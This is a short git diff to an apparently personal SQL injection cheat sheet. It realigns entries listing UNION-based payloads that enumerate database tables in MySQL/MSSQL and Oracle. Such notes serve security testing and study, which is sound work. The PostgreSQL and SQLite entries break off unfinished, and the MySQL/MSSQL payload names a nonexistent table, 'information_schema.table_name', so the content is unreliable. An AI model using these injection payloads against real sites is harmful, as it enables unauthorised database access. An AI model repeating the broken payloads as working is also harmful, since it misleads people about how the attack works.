@@ -19,9 +19,9 @@ z## SQLI-Query-Notes
 ```
 #### Database Contents
 ```
-● MySQL / Microsoft SQL Server / : ' UNION SELECT table_name FROM information_schema.table_name-- (if column count more than one put NULL after table_name)
-  PostgreSQL                     
-                                  ' UNION 
+● MySQL / Microsoft SQL Server  : ' UNION SELECT table_name FROM information_schema.table_name-- (if column count more than one put NULL after table_name)
+  / PostgreSQL                    ' UNION  
+                                  
 ● Oracle                        : ' UNION SELECT table_name FROM all_tables-- (if column count more than one put NULL after table_name)
 ● SQLite                        : ' 
 ```
